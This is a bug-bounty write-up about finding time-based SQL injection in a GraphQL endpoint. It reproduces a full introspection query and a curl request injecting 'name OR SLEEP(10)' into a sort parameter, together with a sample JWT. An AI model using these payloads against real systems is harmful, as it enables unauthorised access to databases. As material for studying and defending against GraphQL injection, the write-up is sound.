---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-13_sql-injection-in-graphql.md
original_filename: 2022-10-13_sql-injection-in-graphql.md
title: SQL Injection in GraphQL
category: documents
detected_topics:
- graphql
- access-control
- sqli
- command-injection
tags:
- imported
- documents
- graphql
- access-control
- sqli
- command-injection
language: en
raw_sha256: 86e4d11d85bb97f103b902ecc860070132850ce0773ba260d19c2c10da59e190
text_sha256: f44a2e311dc0ef11b73bde70ef9b0663d0b26b957dc102d8cebcb77e8a3163e5
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# SQL Injection in GraphQL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-13_sql-injection-in-graphql.md
- Source Type: markdown
- Detected Topics: graphql, access-control, sqli, command-injection
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `86e4d11d85bb97f103b902ecc860070132850ce0773ba260d19c2c10da59e190`
- Text SHA256: `f44a2e311dc0ef11b73bde70ef9b0663d0b26b957dc102d8cebcb77e8a3163e5`


## Content

---
title: "SQL Injection in GraphQL"
url: "https://0xgad.medium.com/sql-injection-in-graphql-2859c96547a8"
authors: ["Ahmed Gad (@0xGAD)"]
bugs: ["SQL injection", "GraphQL"]
publication_date: "2022-10-13"
added_date: "2022-10-17"
source: "pentester.land/writeups.json"
original_index: 2050
scraped_via: "browseros"
---

# SQL Injection in GraphQL

SQL Injection in GraphQL
Ahmed Gad
Follow
3 min read
·
Oct 13, 2022

221

Hello friends I’m Ahmed Gad This Is First Write-Up I Hope you like It

After Recon I got 403 in the subdomain

Press enter or click to view image in full size

I Start FUZZ On Subdomain

I Got 500 Internal Server Error On Endpoint GraphQL

Press enter or click to view image in full size

GraphQL Was Initially Developed and Used By Facebook as an Internal Query Language and so The Features of GraphQL Mostly Revolve Around Internal and Development Areas.

GraphQL Executes Queries Using a Type System With The Data Defined. An Important But Often Ignored Feature Of GraphQL Is The Ability To Ask GraphQL Schema About The Supported Queries With The Help Of Interospection Sytem

I will start in exploit

Get Ahmed Gad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Given That There Are Some Situations Where You Don’t Know What Type You’ll Get Back From The GraphQL Service, You Need Some Way To Determine How To Handle That Data on The Client. GraphQL Allows You To Request __typename, a Meta Field, at any Point In a Query To Get The Name Of The Object Type At That Point

Press enter or click to view image in full size

The Following graphql GraphQL Is an Interospection Query That Completely Reveals The Defined System With All Required Details

{"query": "query IntrospectionQuery {__schema {queryType { name },mutationType { name },subscriptionType { name },types {...FullType},directives {name,description,args {...InputValue},onOperation,onFragment,onField}}}\nfragment FullType on __Type {kind,name,description,fields(includeDeprecated: true) {name,description,args {...InputValue},type {...TypeRef},isDeprecated,deprecationReason},inputFields {...InputValue},interfaces {...TypeRef},enumValues(includeDeprecated: true) {name,description,isDeprecated,deprecationReason},possibleTypes {...TypeRef}}\nfragment InputValue on __InputValue {name,description,type { ...TypeRef },defaultValue}\nfragment TypeRef on __Type {kind,name,ofType {kind,name,ofType {kind,name,ofType {kind,name}}}}"}

Reference

Press enter or click to view image in full size

Run curl command with time and check the response time, sleep(10):

curl -i -s -k  -X $'POST' \
  -H $'Host: example.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://example.com/dashboard' -H $'content-type: application/json' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' -H $'Origin: http://example.com' -H $'Content-Length: 663' -H $'DNT: 1' -H $'Connection: close' \
  --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name OR SLEEP(10)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n  id\n  n\n  __typen\n  }\n  me {\n  firstN\n  lastN\n  usern\n  __typen\n  }\n  components {\n  title\n  __typen\n  }\n  templates {\n  title\n  __typen\n  }\n  fonts {\n  n\n  __typen\n  }\n  partners {\n  id\n  n\n  banners {\n  n\n  __typen\n  }\n  __typen\n  }\n}\n"}' \

finally, Thank you to read this write-up :)

Contact me if you want : Twitter or LinkedIn
